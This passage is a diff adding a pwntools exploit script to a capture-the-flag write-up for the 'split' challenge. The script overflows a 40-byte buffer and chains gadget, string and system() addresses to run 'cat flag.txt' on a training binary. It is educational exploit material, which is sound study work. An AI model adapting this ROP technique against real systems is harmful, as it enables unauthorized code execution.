@@ -95,8 +95,28 @@ And the address of this string is 0x0001060.
 Now we try to make an overflow and return to the address of system function after that and try to exec the system function with the parameter /bin/cat flag.txt
 
 
+## Build and Analyze the code
+from pwn import *
+
+# create a process object and load the executable binary
+p = process('./split')
 
 
+
+# determine the offset to the return address on the stack
+offset = 40
+
+# retrieve the addresses of the desired functions/strings using the ELF object
+ret_address = 0x00000000004007c3
+
+
+# construct the payload by padding the offset with arbitrary characters
+# then appending the address of the return instruction and the address of the system call with the argument of the flag file
+payload = b'A' * offset + p64(ret_address) + p64(0x00601060) + p64(0x0040074b)
+
+# send the payload to the process and get the result
+p.sendline(payload)
+p.interactive()
 
 
 ## Catch the Flag!!
